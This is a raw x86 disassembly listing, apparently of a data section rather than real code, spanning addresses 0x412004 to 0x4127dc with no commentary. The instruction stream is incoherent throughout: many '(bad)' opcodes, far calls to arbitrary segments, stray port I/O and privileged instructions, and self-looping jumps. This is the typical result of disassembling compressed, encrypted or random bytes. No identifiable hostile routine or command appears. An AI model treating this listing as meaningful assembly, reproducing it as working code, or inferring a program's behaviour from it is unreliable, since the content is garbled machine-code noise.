  412004:	cs aad 0xca
  412007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412008:	call   0xac74:0x5152e1f0
  41200f:	repnz mov ds:0x5886c476,al
  412015:	push   0x9
  412017:	adc    al,0x25
  412019:	js     0x412019
  41201b:	jmp    0x42fd:0x7065bc9c
  412022:	dec    ebx
  412023:	in     al,0xa6
  412025:	test   al,0x83
  412027:	or     DWORD PTR [eax],esi
  412029:	adc    bh,BYTE PTR [eax+0x3]
  41202c:	iret   
  41202d:	push   esi
  41202e:	mov    ds:0x771912d5,eax
  412033:	or     DWORD PTR [eax+0x48],esp
  412036:	lods   eax,DWORD PTR ds:[esi]
  412037:	(bad)  
  412038:	fdiv   DWORD PTR [eax+0x4b]
  41203b:	jl     0x412071
  41203d:	xlat   BYTE PTR ds:[ebx]
  41203e:	cdq    
  41203f:	adc    eax,0xac3818d2
  412044:	or     eax,0xdb6dd3cd
  412049:	cmp    BYTE PTR [ebx],cl
  41204b:	sub    eax,0xa59b8d85
  412050:	lds    esp,FWORD PTR [edi]
  412052:	add    esp,DWORD PTR [eax]
  412054:	sbb    al,BYTE PTR [edi]
  412056:	frstor [ebx-0x4f85688e]
  41205c:	push   es
  41205d:	push   ds
  41205e:	or     al,0x22
  412060:	adc    eax,0x990a25dc
  412065:	inc    esi
  412066:	imul   ebx,DWORD PTR [ecx+0x18b05f35],0xe128acb9
  412070:	sub    edx,DWORD PTR fs:[edi]
  412073:	mov    ds:0x4caae3ba,al
  412078:	fist   DWORD PTR [eax-0x5d]
  41207b:	repz mov dl,0xd8
  41207e:	push   esp
  41207f:	enter  0x1b3c,0x40
  412083:	adc    BYTE PTR [esi+0x9c318a7],ch
  412089:	fs pop eax
  41208b:	and    eax,0x7f6fc45d
  412090:	aas    
  412091:	(bad)  
  412092:	jp     0x4120f1
  412094:	mul    BYTE PTR [ebx+ebp*1+0x6]
  412098:	dec    edi
  412099:	lods   eax,DWORD PTR ds:[esi]
  41209a:	push   edx
  41209b:	shl    BYTE PTR [edi-0x45],1
  41209e:	retf   0xab07
  4120a1:	mov    al,ds:0x4a03099b
  4120a6:	lock xor BYTE PTR [ebp-0x68c5ab26],ah
  4120ad:	push   ds
  4120ae:	xor    al,0x1e
  4120b0:	push   ss
  4120b1:	test   ch,0xb9
  4120b4:	es mov ch,0xb0
  4120b7:	stc    
  4120b8:	jne    0x41206f
  4120ba:	jg     0x412069
  4120bc:	out    0xad,al
  4120be:	shl    ah,cl
  4120c0:	and    BYTE PTR [ecx],0xcc
  4120c3:	jp     0x41206f
  4120c5:	shl    DWORD PTR [ebx],0xf6
  4120c8:	retf   
  4120c9:	mov    ecx,0x5a2cc52c
  4120ce:	enter  0x38c1,0xc3
  4120d2:	test   al,0x16
  4120d4:	(bad)  
  4120d5:	iret   
  4120d6:	fs jmp 0xdcae:0xe03fe962
  4120de:	int3   
  4120df:	dec    edi
  4120e0:	(bad)  
  4120e1:	jecxz  0x412159
  4120e3:	mov    dl,0x17
  4120e5:	push   0x3c62f767
  4120ea:	(bad)  
  4120ec:	xchg   edx,eax
  4120ed:	shl    DWORD PTR [ecx],0xd3
  4120f0:	mov    esi,DWORD PTR [edx-0x11]
  4120f3:	out    0x93,al
  4120f5:	sbb    BYTE PTR [ebp+0x2c],dh
  4120f8:	in     eax,0x17
  4120fa:	mov    bh,al
  4120fc:	push   ebx
  4120fd:	sub    edx,DWORD PTR [ecx+0x14]
  412100:	pop    esi
  412101:	shr    ecx,cl
  412103:	lock aad 0xd
  412106:	iret   
  412107:	adc    esi,DWORD PTR [ebp+0x3]
  41210a:	jge    0x412138
  41210c:	retf   
  41210d:	(bad)  
  41210e:	jg     0x41216c
  412110:	sbb    eax,DWORD PTR [edx]
  412112:	mov    dh,0x56
  412114:	(bad)  
  412115:	loopne 0x4120ab
  412117:	cmp    al,cl
  412119:	push   esi
  41211a:	xchg   DWORD PTR [ecx+esi*1-0x66b2f4d9],edx
  412121:	arpl   WORD PTR [eax+0x64],dx
  412124:	pop    ebx
  412125:	jmp    ecx
  412127:	dec    ecx
  412128:	ds push 0xffffff94
  41212b:	arpl   WORD PTR [ecx],ax
  41212d:	sbb    eax,0x711ac819
  412132:	dec    ebx
  412133:	cmp    al,0xda
  412135:	out    0x3c,eax
  412137:	mov    bh,0xaa
  412139:	ins    BYTE PTR es:[edi],dx
  41213a:	mov    edi,0xb2ddcd53
  41213f:	inc    esi
  412140:	(bad)  
  412141:	repz bound ebp,QWORD PTR [esi]
  412144:	scas   eax,DWORD PTR es:[edi]
  412145:	push   0x49
  412147:	xchg   ecx,eax
  412148:	std    
  412149:	(bad)  
  41214a:	push   ebp
  41214b:	lods   al,BYTE PTR fs:[esi]
  41214d:	aad    0xaf
  41214f:	xor    ch,ah
  412151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412152:	xor    ch,cl
  412154:	call   0xbeaa:0x44042a8d
  41215b:	sub    esi,DWORD PTR [ebx+0x2c]
  41215e:	push   edx
  41215f:	(bad)  [ebx]
  412161:	pop    ebx
  412162:	lock aad 0x65
  412165:	call   0x6f3e:0xac66b200
  41216c:	lds    esi,FWORD PTR [eax+0x13]
  41216f:	xchg   ecx,eax
  412170:	and    eax,0xb68d9df7
  412175:	push   0x51aec3fd
  41217a:	dec    ebx
  41217b:	push   0xfffffffa
  41217d:	retf   0x75d4
  412180:	rcl    BYTE PTR [ebx],0x91
  412183:	mov    bh,0xb7
  412185:	xor    ebx,DWORD PTR [esi-0x47]
  412188:	arpl   WORD PTR [ebp-0x44474265],bp
  41218e:	imul   eax,eax,0x12
  412191:	in     eax,0x53
  412193:	xor    dl,BYTE PTR [ebp+0x1d]
  412196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412197:	in     eax,0xe0
  412199:	inc    ebx
  41219a:	mov    ecx,0xc5a0b4ad
  41219f:	rol    BYTE PTR [edi+0x2a],1
  4121a2:	push   ecx
  4121a3:	adc    DWORD PTR [ecx-0x73c3c271],esi
  4121a9:	ror    DWORD PTR [ecx+0x523a8ea8],0x65
  4121b0:	pop    ebp
  4121b1:	clc    
  4121b2:	ja     0x41222b
  4121b4:	enter  0x3fca,0xde
  4121b8:	xor    al,0x1e
  4121ba:	xchg   edi,eax
  4121bb:	daa    
  4121bc:	ret    0xf32
  4121bf:	arpl   WORD PTR [edx-0x6f9fc6ed],si
  4121c5:	mov    cl,al
  4121c7:	inc    esi
  4121c8:	push   cs
  4121c9:	cmc    
  4121ca:	sbb    al,0x20
  4121cc:	inc    ebp
  4121cd:	shl    DWORD PTR [ecx-0x6eb6eb47],1
  4121d3:	rol    BYTE PTR cs:[eax+eiz*2-0x2d],1
  4121d8:	push   esi
  4121d9:	hlt    
  4121da:	dec    ecx
  4121db:	in     al,dx
  4121dc:	mov    esi,DWORD PTR [ebp-0x10]
  4121df:	(bad)  
  4121e2:	inc    edx
  4121e3:	sub    al,0x96
  4121e5:	in     eax,dx
  4121e6:	add    al,0x4
  4121e8:	fsubr  st(3),st
  4121ea:	mov    eax,0x19b186fb
  4121ef:	sub    BYTE PTR [esi],ch
  4121f1:	push   esp
  4121f2:	or     DWORD PTR [ebx+0x6c],esp
  4121f5:	sbb    eax,0xa91f1032
  4121fa:	add    al,0x47
  4121fc:	jmp    0x4121b7
  4121fe:	mov    ebx,0x2530da4
  412203:	add    al,0x6e
  412205:	push   eax
  412206:	xor    BYTE PTR [esi+0x5657ddbc],bh
  41220c:	imul   esi,edx,0x72
  41220f:	and    BYTE PTR [edx-0x63],bl
  412212:	jae    0x4121fd
  412214:	pusha  
  412215:	sahf   
  412216:	and    esi,DWORD PTR [ebx-0x6a9ae482]
  41221c:	mov    ah,0x56
  41221e:	lods   al,BYTE PTR ds:[esi]
  41221f:	outs   dx,DWORD PTR ds:[esi]
  412220:	sbb    ecx,DWORD PTR [esi]
  412222:	pop    ebx
  412223:	sbb    esi,DWORD PTR [ebx-0x6d]
  412226:	xchg   cl,al
  412228:	adc    esi,DWORD PTR [esi+0x31]
  41222b:	or     DWORD PTR [esi-0x304051b3],esi
  412231:	push   edi
  412232:	ret    
  412233:	pop    esp
  412234:	cld    
  412235:	mov    esp,ds
  412237:	push   esp
  412238:	les    esp,FWORD PTR [esi+0x754479b9]
  41223e:	aad    0xb1
  412240:	pop    ss
  412241:	pop    es
  412242:	push   cs
  412243:	sbb    al,0x66
  412245:	shr    DWORD PTR ds:0xb49502d,0x93
  41224c:	out    dx,al
  41224d:	retf   0xb447
  412250:	lds    eax,FWORD PTR [edx]
  412252:	pop    ebx
  412253:	jne    0x4122ce
  412255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412256:	out    0xd8,al
  412258:	add    cl,BYTE PTR [eax]
  41225a:	loopne 0x412295
  41225c:	inc    edi
  41225d:	scas   al,BYTE PTR es:[edi]
  41225e:	in     al,dx
  41225f:	inc    ebp
  412260:	cmp    bl,0x24
  412263:	dec    esi
  412264:	call   0xcc96:0x25b1da4b
  41226b:	ss mov ebx,0x2e43a9f7
  412271:	xor    al,0xa5
  412273:	mov    bh,0xa4
  412275:	out    0x3f,eax
  412277:	lock imul BYTE PTR [ebp+0x7b]
  41227b:	dec    edx
  41227c:	dec    edi
  41227d:	cdq    
  41227e:	dec    edi
  41227f:	xchg   BYTE PTR [ebx-0x49],dh
  412282:	cmp    eax,DWORD PTR [edi]
  412284:	loopne 0x412242
  412286:	inc    esi
  412287:	cmp    BYTE PTR [ebp+0x42],dl
  41228a:	xchg   ebx,eax
  41228b:	inc    ecx
  41228c:	dec    edi
  41228d:	div    ah
  41228f:	test   DWORD PTR [esi-0x6597984f],esi
  412295:	pop    eax
  412296:	jne    0x412274
  412298:	push   0xeeccd31f
  41229d:	mov    ch,dh
  41229f:	(bad)  
  4122a0:	xchg   edx,eax
  4122a1:	jns    0x412229
  4122a3:	sti    
  4122a4:	cmc    
  4122a5:	(bad)  
  4122a6:	add    WORD PTR [edi+0x103214b3],di
  4122ad:	fwait
  4122ae:	retf   0x7e4c
  4122b1:	push   ebx
  4122b2:	pop    es
  4122b3:	(bad)  [ebx+0x20c36a47]
  4122b9:	or     BYTE PTR [ebp+edx*1-0x1ac28ef3],ah
  4122c0:	adc    ch,bh
  4122c2:	je     0x412263
  4122c4:	ins    BYTE PTR es:[edi],dx
  4122c5:	sbb    eax,0xc74ce091
  4122ca:	mov    BYTE PTR [edi],ah
  4122cc:	xchg   eax,ebx
  4122ce:	fiadd  DWORD PTR [ecx+edx*4-0x35]
  4122d2:	out    dx,eax
  4122d3:	clc    
  4122d4:	fwait
  4122d5:	out    dx,al
  4122d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122d7:	fiadd  WORD PTR [edi]
  4122d9:	imul   ebp,DWORD PTR [esi-0x2d7b636a],0xffffffee
  4122e0:	aad    0xb8
  4122e2:	xchg   ebx,eax
  4122e3:	inc    esp
  4122e4:	(bad)  
  4122e5:	data16 arpl si,di
  4122e8:	fadd   QWORD PTR ds:0x49912bf9
  4122ee:	jb     0x4122a8
  4122f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122f1:	xchg   esi,eax
  4122f2:	ss xchg esi,eax
  4122f4:	jmp    FWORD PTR [ecx+0x79]
  4122f7:	rcr    BYTE PTR [edi+esi*1],0x5d
  4122fb:	repz mov ch,0xa8
  4122fe:	mov    edx,edi
  412300:	inc    edi
  412301:	xor    ebp,ecx
  412303:	jl     0x412361
  412305:	outs   dx,DWORD PTR ds:[esi]
  412306:	or     BYTE PTR [esi],bh
  412308:	mov    ch,0x8
  41230a:	inc    esi
  41230b:	ja     0x412375
  41230d:	or     al,bh
  41230f:	mov    ch,0x24
  412311:	push   edx
  412312:	out    0xf1,eax
  412314:	sar    BYTE PTR gs:[ecx+0x4abe9154],cl
  41231b:	fadd   DWORD PTR [eax]
  41231d:	mov    eax,ds:0x6d56a247
  412322:	mov    esp,0x373fae08
  412327:	inc    ecx
  412328:	or     DWORD PTR [ebx+ebx*2+0x7eb2acc2],edx
  41232f:	ins    BYTE PTR es:[edi],dx
  412330:	addr16 xor bh,bl
  412333:	pushw  0x3128
  412337:	enter  0x86dd,0x7e
  41233b:	xlat   BYTE PTR ds:[ebx]
  41233c:	push   esi
  41233d:	and    al,0xf4
  41233f:	adc    BYTE PTR [esi+0x18],0xa1
  412343:	sbb    eax,0xf4fb7d03
  412348:	mov    al,ds:0x471b831a
  41234d:	and    BYTE PTR [edi-0x22],al
  412350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412351:	push   esp
  412352:	shl    DWORD PTR [edi],1
  412354:	pushf  
  412355:	mov    bh,0x45
  412357:	fwait
  412358:	loopne 0x41236b
  41235a:	push   0xbe1e55ea
  41235f:	ret    
  412360:	mov    ah,0x78
  412362:	inc    ecx
  412363:	in     eax,dx
  412364:	test   al,0xdd
  412366:	push   0xc7016286
  41236b:	sub    edi,DWORD PTR [ebp+0x65610ed9]
  412371:	push   esp
  412372:	inc    esp
  412373:	mov    eax,0x24554b84
  412378:	js     0x412396
  41237a:	mov    es,WORD PTR [ebx]
  41237c:	mov    al,0xf6
  41237e:	dec    edi
  41237f:	pop    ebp
  412380:	mov    dl,BYTE PTR [edi-0x1d]
  412383:	ins    DWORD PTR es:[edi],dx
  412384:	mov    esp,0xf7d45e97
  412389:	mov    WORD PTR [ebp+0x6e115e25],ss
  41238f:	push   esp
  412390:	pop    esp
  412391:	cmp    eax,0xc1afb1c7
  412396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412397:	ja     0x4123d8
  412399:	and    eax,0xdb4ee832
  41239e:	neg    WORD PTR [eax-0x1b]
  4123a2:	clc    
  4123a3:	ret    0xd24
  4123a6:	xchg   esp,eax
  4123a7:	cmp    DWORD PTR [edx+0x1b9d67b5],0xf14b56c
  4123b1:	not    DWORD PTR [esp+esi*4-0x44]
  4123b5:	sahf   
  4123b6:	xor    eax,DWORD PTR [eax-0x28]
  4123b9:	aad    0x18
  4123bb:	pop    ebx
  4123bc:	cmp    BYTE PTR ds:0x971255fa,ch
  4123c2:	or     BYTE PTR [edx],bl
  4123c4:	xchg   esi,eax
  4123c5:	out    dx,al
  4123c6:	mov    ah,0x9
  4123c8:	ror    DWORD PTR [eax-0x7d],0xd
  4123cc:	(bad)  
  4123ce:	xor    DWORD PTR [ecx+ebp*8+0x5],esi
  4123d2:	in     eax,0x54
  4123d4:	push   esp
  4123d5:	push   cs
  4123d6:	adc    esi,DWORD PTR [esp]
  4123d9:	pop    es
  4123da:	retf   0x1024
  4123dd:	lea    edi,ss:[edi-0x6409a818]
  4123e4:	rol    BYTE PTR [esi],cl
  4123e6:	push   ecx
  4123e7:	js     0x41245b
  4123e9:	test   al,0x96
  4123eb:	mov    dh,ch
  4123ed:	xor    edi,DWORD PTR [ecx+ebx*2]
  4123f0:	dec    eax
  4123f1:	cmp    ebx,esi
  4123f3:	lahf   
  4123f4:	stc    
  4123f5:	push   ss
  4123f6:	add    al,0x4e
  4123f8:	mov    edx,0xa07aa75c
  4123fd:	jae    0x412415
  4123ff:	fdivr  DWORD PTR [edx]
  412401:	popa   
  412402:	inc    WORD PTR [esi]
  412405:	jmp    0x4123ac
  412407:	scas   al,BYTE PTR es:[edi]
  412408:	mov    bl,0x21
  41240a:	dec    eax
  41240b:	gs into 
  41240d:	inc    esp
  41240e:	inc    DWORD PTR [ebp+0x18]
  412411:	dec    edx
  412412:	jecxz  0x4123e5
  412414:	push   ss
  412415:	gs repnz mov eax,0xb287451f
  41241c:	(bad)  
  41241d:	jp     0x412415
  41241f:	push   ebp
  412420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412421:	mov    ah,0x65
  412424:	adc    bh,dl
  412426:	jo     0x412448
  412428:	dec    ebx
  412429:	mov    cl,0x6f
  41242b:	add    BYTE PTR [ecx-0x6890a9d6],dl
  412431:	xchg   ebx,esi
  412433:	je     0x41244e
  412435:	jmp    0x412478
  412437:	rcr    DWORD PTR [ecx-0x19],0x3a
  41243b:	sub    edi,ecx
  41243d:	and    DWORD PTR [edx-0x7d4986d0],edx
  412443:	test   eax,0xf04a4048
  412448:	mov    bl,0x26
  41244a:	aam    0xc
  41244c:	(bad)  [esi]
  41244e:	ins    BYTE PTR es:[edi],dx
  41244f:	mov    edi,0xb4a4ac63
  412454:	shl    dl,cl
  412456:	xor    al,0x24
  412458:	mov    bl,0x57
  41245a:	pop    edx
  41245b:	cmp    ecx,edx
  41245d:	(bad)  
  41245e:	call   0x67a05243
  412463:	sbb    BYTE PTR [ecx+0x45113848],al
  412469:	ficom  WORD PTR [esi]
  41246b:	ss xor eax,0xb8cd76d5
  412471:	jl     0x41249e
  412473:	pop    esp
  412474:	data16 sti 
  412476:	lahf   
  412477:	inc    edx
  412478:	mov    esi,0x84868856
  41247d:	and    eax,0x6d1f2b8c
  412482:	int    0xca
  412484:	dec    ecx
  412485:	add    eax,0x847c2e33
  41248a:	dec    esp
  41248b:	int3   
  41248c:	jae    0x4124fd
  41248e:	popa   
  41248f:	repz loope 0x4124d6
  412492:	hlt    
  412493:	aad    0xb1
  412495:	and    al,0x90
  412497:	(bad)  
  412498:	repnz push ebx
  41249a:	jecxz  0x4124f7
  41249c:	push   eax
  41249d:	xlat   BYTE PTR ds:[ebx]
  41249e:	nop
  41249f:	lds    ebp,FWORD PTR [ecx+0x47]
  4124a2:	inc    ecx
  4124a3:	fsubp  st(3),st
  4124a5:	lods   eax,DWORD PTR ds:[esi]
  4124a6:	xchg   esi,eax
  4124a7:	sub    BYTE PTR [edi+0xd],bh
  4124aa:	add    esi,0x4911026a
  4124b0:	or     ch,BYTE PTR [ecx-0x80]
  4124b3:	mov    edx,0x4ef85b90
  4124b8:	loop   0x412506
  4124ba:	push   ebp
  4124bb:	xor    DWORD PTR [edx],ecx
  4124bd:	retf   
  4124be:	daa    
  4124bf:	xor    BYTE PTR [edi],bl
  4124c1:	fldcw  WORD PTR [eax-0x5a]
  4124c4:	mov    eax,ds:0xbdd961d0
  4124c9:	mov    ebp,DWORD PTR [edi+0x6b98e021]
  4124cf:	jmp    0xbc4a3b59
  4124d4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4124d6:	lods   al,BYTE PTR ds:[esi]
  4124d7:	or     dh,BYTE PTR [edi-0xe]
  4124da:	pop    esp
  4124db:	mov    dl,0x28
  4124dd:	xchg   DWORD PTR [ebx-0x75],edi
  4124e0:	lea    edi,[eax+0x44]
  4124e3:	or     BYTE PTR [eax],0xf5
  4124e6:	add    ch,BYTE PTR [ecx+0x6173ecfa]
  4124ec:	arpl   WORD PTR [ebx+0x7a],di
  4124ef:	inc    ebp
  4124f0:	jge    0x412498
  4124f2:	mov    ah,0x46
  4124f4:	jecxz  0x4124b6
  4124f6:	pop    ss
  4124f7:	out    dx,eax
  4124f8:	xor    al,bl
  4124fa:	ss cld 
  4124fc:	mov    bl,0x5a
  4124fe:	pop    edx
  4124ff:	(bad)  
  412500:	fistp  DWORD PTR [eax+ebx*4+0x9]
  412504:	xlat   BYTE PTR ds:[ebx]
  412505:	cmp    DWORD PTR [edx+eiz*4],esp
  412508:	pop    ss
  412509:	jl     0x41254e
  41250b:	sub    edi,ebx
  41250d:	and    esi,DWORD PTR [ebx-0x5ff1e737]
  412513:	mov    eax,0xe9dab9e8
  412518:	ret    0xb528
  41251b:	add    esi,DWORD PTR [ecx+ebx*8-0x57616d64]
  412522:	fmul   DWORD PTR [ebp-0x31]
  412525:	xor    al,ah
  412527:	cmp    eax,0x4c450954
  41252c:	pop    esp
  41252d:	mov    bh,0x85
  41252f:	fwait
  412530:	aas    
  412531:	xchg   edx,eax
  412532:	fimul  DWORD PTR [ebx]
  412534:	dec    esp
  412535:	xchg   DWORD PTR [eax+0xeb85efa],esi
  41253b:	inc    ebp
  41253c:	xchg   esp,eax
  41253d:	ss push ds
  41253f:	cmp    al,0x48
  412541:	xor    DWORD PTR [edx-0x4d],0xffffffc7
  412545:	adc    al,0x84
  412547:	fsub   DWORD PTR [ecx-0x2971083c]
  41254e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41254f:	jns    0x4125bf
  412551:	je     0x412582
  412553:	xor    BYTE PTR [esi-0x427a3fdd],dl
  412559:	sub    bh,ch
  41255b:	inc    eax
  41255c:	jl     0x41252f
  41255e:	neg    DWORD PTR [edx+0x78efeda4]
  412564:	shl    DWORD PTR [ebx+0x18],0xbc
  412568:	xor    edx,DWORD PTR [edx+0x4e]
  41256b:	call   0xb0ce0ed3
  412570:	jmp    0x412527
  412572:	ins    DWORD PTR es:[edi],dx
  412573:	adc    esp,DWORD PTR [edx+ebp*4-0x13c1db28]
  41257a:	loopne 0x412516
  41257c:	mov    DWORD PTR [esi],edx
  41257e:	in     eax,dx
  41257f:	jo     0x412511
  412581:	ins    BYTE PTR es:[edi],dx
  412582:	fmul   st,st(5)
  412584:	imul   esp,DWORD PTR [ecx-0x5f872125],0xed540b7e
  41258e:	loope  0x4125e1
  412590:	pop    edi
  412591:	inc    ebp
  412592:	in     eax,dx
  412593:	jmp    0x4125e4
  412595:	xchg   ecx,eax
  412596:	add    DWORD PTR [ebx+ebp*8],ecx
  412599:	sub    dl,dl
  41259b:	pop    es
  41259c:	sti    
  41259d:	xor    DWORD PTR es:[ebp+0x53],esi
  4125a1:	shr    BYTE PTR ds:0x878963f3,0xf
  4125a8:	adc    eax,ebp
  4125aa:	push   0x9
  4125ac:	mov    WORD PTR [esi],?
  4125ae:	mov    ss,WORD PTR [esi-0x774ea504]
  4125b4:	sahf   
  4125b5:	push   edi
  4125b6:	mov    cl,0x24
  4125b8:	mov    ds,ebp
  4125ba:	cli    
  4125bb:	sub    bh,ch
  4125bd:	or     edx,DWORD PTR [esi+ebx*1+0x13]
  4125c1:	aaa    
  4125c2:	xor    al,ah
  4125c4:	jmp    0x4125ba
  4125c6:	das    
  4125c7:	pop    ss
  4125c8:	pop    edi
  4125c9:	xor    BYTE PTR [esi-0x6d],dl
  4125cc:	frstor [ecx]
  4125ce:	cmp    ebp,esi
  4125d0:	cdq    
  4125d1:	add    esi,edx
  4125d3:	js     0x412652
  4125d5:	hlt    
  4125d6:	sub    DWORD PTR [esi+0x0],esi
  4125d9:	(bad)  
  4125da:	inc    edx
  4125db:	gs push ds
  4125dd:	mov    WORD PTR [edi-0x49],ss
  4125e0:	test   al,0xe4
  4125e2:	or     DWORD PTR [eax+0x1c042cef],0xffffff8c
  4125e9:	fild   DWORD PTR [esi]
  4125eb:	int3   
  4125ec:	push   ds
  4125ed:	outs   dx,BYTE PTR ds:[esi]
  4125ee:	mov    esi,0xe526f329
  4125f3:	inc    esi
  4125f4:	and    eax,0x304c54ce
  4125f9:	ds (bad) 
  4125fb:	sbb    BYTE PTR [ebx-0x13],bl
  4125fe:	dec    ebp
  4125ff:	out    dx,eax
  412600:	xor    cl,BYTE PTR [ecx]
  412602:	stos   BYTE PTR es:[edi],al
  412603:	push   ds
  412604:	xchg   ecx,eax
  412605:	jle    0x4125e3
  412607:	jecxz  0x412656
  412609:	aas    
  41260a:	rol    dl,cl
  41260c:	(bad)  
  41260d:	sbb    ecx,DWORD PTR [eax+esi*1+0x35]
  412611:	ret    0xf49c
  412614:	sub    BYTE PTR [ebx+eax*4+0x7b3694a6],dh
  41261b:	cs inc edi
  41261d:	mov    ds:0x5940ec2e,al
  412622:	mov    ds:0x225e860c,eax
  412627:	mov    ah,0xbe
  412629:	out    dx,eax
  41262a:	fnstcw WORD PTR [ecx+0x6cb27f01]
  412630:	lods   eax,DWORD PTR ds:[esi]
  412631:	sbb    eax,DWORD PTR [ebp+0xf2a137a]
  412637:	pop    es
  412638:	stos   DWORD PTR es:[edi],eax
  412639:	adc    eax,0x1246bd3c
  41263e:	mov    dh,0x6f
  412640:	sbb    al,0xbb
  412642:	pop    es
  412643:	gs ret 0xa139
  412647:	sbb    eax,0x52842068
  41264c:	mov    edx,0x1b339294
  412651:	cmp    eax,edi
  412653:	pop    esi
  412654:	lea    esp,[eax+0x30f3ec4e]
  41265a:	xchg   ecx,eax
  41265b:	pushf  
  41265c:	cs pop ds
  41265e:	js     0x412692
  412660:	add    edi,edi
  412662:	sti    
  412663:	xor    ebx,DWORD PTR gs:[edi-0x41a6b27b]
  41266a:	int    0xfd
  41266c:	neg    BYTE PTR [ebx-0x2b561aac]
  412672:	lods   al,BYTE PTR ds:[esi]
  412673:	jnp    0x412661
  412675:	or     BYTE PTR [eax-0x39d97e4c],ah
  41267b:	outs   dx,DWORD PTR ds:[esi]
  41267c:	stc    
  41267d:	inc    esi
  41267e:	pusha  
  41267f:	push   ss
  412680:	mov    ebx,es
  412682:	xchg   edx,eax
  412683:	xchg   edi,eax
  412684:	nop
  412685:	pop    es
  412686:	xchg   edx,eax
  412687:	pop    ds
  412688:	xchg   esp,eax
  412689:	out    dx,al
  41268a:	loop   0x412680
  41268c:	jg     0x412639
  41268e:	sbb    ch,BYTE PTR [ecx-0x13]
  412691:	call   0xc92d0270
  412696:	repz ffreep st(0)
  412699:	in     eax,0x3c
  41269b:	add    DWORD PTR [eax+ebp*8-0x67],0xffffffca
  4126a0:	xor    cl,BYTE PTR [eax-0x48]
  4126a3:	mov    al,0xc
  4126a5:	retf   
  4126a6:	and    al,0xd3
  4126a8:	mov    al,0x19
  4126aa:	cdq    
  4126ab:	(bad)  
  4126ac:	mov    ds,WORD PTR [eax+0x60]
  4126af:	dec    esi
  4126b0:	push   0xe5bbb256
  4126b5:	addr16 dec esp
  4126b7:	retf   
  4126b8:	xlat   BYTE PTR es:[ebx]
  4126ba:	icebp  
  4126bb:	sub    edx,0xffffffb5
  4126be:	mov    edx,DWORD PTR ds:0x3e20b5da
  4126c4:	adc    al,0xf6
  4126c6:	xchg   ecx,eax
  4126c7:	sub    eax,0xc0a9a811
  4126cc:	jno    0x412667
  4126ce:	aam    0xb6
  4126d0:	out    dx,eax
  4126d1:	jmp    0x98381556
  4126d6:	pop    ebx
  4126d7:	js     0x41268a
  4126d9:	js     0x412759
  4126db:	aam    0x6
  4126dd:	or     ah,bl
  4126df:	fsub   DWORD PTR [ebx]
  4126e1:	ret    0x123e
  4126e4:	lea    edi,[ecx-0x32]
  4126e7:	inc    edx
  4126e8:	mov    cl,0x4
  4126ea:	ficom  DWORD PTR ds:0x370b6f8b
  4126f0:	or     ch,cl
  4126f2:	int    0x78
  4126f4:	imul   eax,DWORD PTR ds:0xa2f88fd,0x6b
  4126fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126fc:	lea    edi,[esi-0x67]
  4126ff:	inc    esi
  412700:	or     BYTE PTR [ecx-0x51],al
  412703:	cmc    
  412704:	les    edi,FWORD PTR [ebx+0x78]
  412707:	repz adc al,0xad
  41270a:	and    BYTE PTR [ebp-0x2a],dl
  41270d:	out    dx,al
  41270e:	jno    0x412722
  412710:	jnp    0x4126c3
  412712:	jmp    0x4126ad
  412714:	and    eax,0xc69cf56d
  412719:	ja     0x412775
  41271b:	mov    edi,0x5302c111
  412720:	in     eax,0x91
  412722:	sbb    al,cl
  412724:	mov    eax,0x353bba01
  412729:	jmp    0xd2be:0x4e0d66ff
  412730:	inc    ebx
  412731:	ds add eax,0x5d045ff
  412737:	dec    ecx
  412738:	xchg   ebp,eax
  412739:	loop   0x41275f
  41273b:	mov    eax,0xeeadeec2
  412740:	push   cs
  412741:	ret    
  412742:	adc    al,BYTE PTR [ebx-0x6ba70bd0]
  412748:	fisub  DWORD PTR [ebx]
  41274a:	nop
  41274b:	pushf  
  41274c:	adc    eax,0xcf69a1cb
  412751:	push   edx
  412752:	fidiv  WORD PTR [ebx-0x23]
  412755:	dec    ebp
  412756:	cmp    BYTE PTR [edi-0x7e],bl
  412759:	ja     0x41272f
  41275b:	adc    BYTE PTR [edi-0x2],dh
  41275e:	aad    0x39
  412760:	ins    BYTE PTR es:[edi],dx
  412761:	loope  0x4126ef
  412763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412764:	jecxz  0x41279e
  412766:	xchg   BYTE PTR [edi+0x16],ch
  412769:	ret    0x5ee1
  41276c:	aam    0xee
  41276e:	sbb    DWORD PTR [eax],0x29
  412771:	or     ebp,DWORD PTR [ebp-0x50fe5282]
  412777:	bound  edx,QWORD PTR [ecx+0x5]
  41277a:	mov    ds:0xac09c226,eax
  41277f:	fs dec esi
  412781:	clc    
  412782:	or     ebx,DWORD PTR [edi-0x77]
  412785:	push   cs
  412786:	scas   eax,DWORD PTR es:[edi]
  412787:	dec    esp
  412788:	jb     0x412765
  41278a:	loope  0x4127ea
  41278c:	jnp    0x412805
  41278e:	add    eax,0x8c183103
  412793:	dec    esi
  412794:	jne    0x412798
  412796:	or     bh,al
  412798:	(bad)  
  412799:	jle    0x412749
  41279b:	mov    esi,0x907b511c
  4127a0:	retf   0xf132
  4127a3:	xor    al,0xae
  4127a5:	lock ficomp WORD PTR [eax+eax*4+0x6a518ba4]
  4127ad:	pop    edx
  4127ae:	adc    bl,BYTE PTR [eiz*4+0x8c35be3]
  4127b5:	in     eax,dx
  4127b6:	aas    
  4127b7:	leave  
  4127b8:	in     eax,0x8a
  4127ba:	sub    ebp,DWORD PTR [ebx-0x5e]
  4127bd:	icebp  
  4127be:	add    esi,DWORD PTR [ebp-0x18]
  4127c1:	call   0x99af:0xf798b585
  4127c8:	xor    al,BYTE PTR [ecx]
  4127ca:	pop    edi
  4127cb:	addr16 mov bh,0xa8
  4127ce:	aad    0x9e
  4127d0:	loop   0x4127e8
  4127d2:	and    al,0x2f
  4127d4:	xor    ecx,DWORD PTR [esp+ebx*1-0x1cdd3eb7]
  4127db:	push   ebx
  4127dc:	mov    cl,0xfe
